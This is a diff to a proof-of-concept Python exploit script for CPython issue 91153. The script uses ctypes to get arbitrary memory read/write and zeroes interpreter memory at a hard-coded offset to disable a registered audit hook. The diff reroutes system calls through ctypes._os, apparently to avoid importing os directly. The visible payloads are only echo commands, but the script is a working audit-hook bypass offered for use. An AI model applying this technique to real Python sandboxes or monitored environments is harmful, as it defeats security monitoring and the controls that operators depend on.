@@ -3,13 +3,13 @@
 ### POC2-issue91153.py
 ### use ctypes to get the addr and smash it with issues/91153
 
-import ctypes, sys, os
+import ctypes, sys
 
 sys.addaudithook((lambda x: lambda *_: x("audit hook triggered!"))(print))
 
 obj = ctypes.byref(ctypes.py_object(()))
 
-os.system("echo 'test audit hook -- this will trigger hook'")
+ctypes._os.system("echo 'test audit hook -- this will trigger hook'")
 
 # following arbitery reading/writing exploit code from https://github.com/python/cpython/issues/91153#issuecomment-1132117665
 # by chilaxan
@@ -40,4 +40,4 @@ for i in range(0, 8):
     # Python 3.12 = 0x41448
     memory[ctypes.cast(obj, ctypes.POINTER(ctypes.c_uint64)).contents.value + 0x41448 + i] = 0
 
-os.system("echo 'test audit hook -- this will not'")
+ctypes._os.system("echo 'test audit hook -- this will not'")
